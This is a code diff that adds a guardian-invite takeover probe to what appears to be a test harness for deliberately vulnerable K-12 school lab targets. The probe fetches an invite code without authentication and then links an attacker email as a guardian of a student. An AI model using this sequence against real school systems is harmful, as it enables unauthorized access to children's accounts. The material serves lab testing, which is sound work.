@@ -207,6 +207,50 @@ async function probePasswordResetTokenLeak() {
   return ["target: k12-password-reset-token-leak", "password_reset_token_leak: confirmed"]
 }
 
+async function probeGuardianInviteTakeover() {
+  const { proc, base } = await startTarget("k12-guardian-invite-takeover")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-guardian-invite-takeover") fail(proc, "health probe failed")
+
+  const invite = await fetch(`${base}/api/guardian/invite?studentId=student-2241`).then((res) =>
+    res.json(),
+  ) as { authenticated?: boolean; inviteCode?: string; labFinding?: string }
+  if (
+    invite.authenticated ||
+    invite.inviteCode !== "guardian-invite-2241" ||
+    invite.labFinding !== "guardian_invite_code_disclosure"
+  ) {
+    fail(proc, "guardian invite probe did not confirm exposed invite code")
+  }
+
+  const link = await fetch(`${base}/api/guardian/accept`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      studentId: "student-2241",
+      inviteCode: invite.inviteCode,
+      email: "attacker-guardian@example.test",
+    }),
+  }).then((res) => res.json()) as {
+    linked?: boolean
+    verifiedBySchool?: boolean
+    guardianCount?: number
+    labFinding?: string
+  }
+  if (
+    !link.linked ||
+    link.verifiedBySchool ||
+    link.guardianCount !== 2 ||
+    link.labFinding !== "guardian_account_takeover"
+  ) {
+    fail(proc, "guardian accept probe did not confirm unauthorized account linking")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-guardian-invite-takeover", "guardian_account_takeover: confirmed"]
+}
+
 const lines = [
   "ulm_lab_target: ok",
   ...(await probeMfaGap()),
@@ -215,6 +259,7 @@ const lines = [
   ...(await probeStorageConfigLeak()),
   ...(await probeStudentSearchInjection()),
   ...(await probePasswordResetTokenLeak()),
+  ...(await probeGuardianInviteTakeover()),
 ]
 
 console.log(lines.join("\n"))
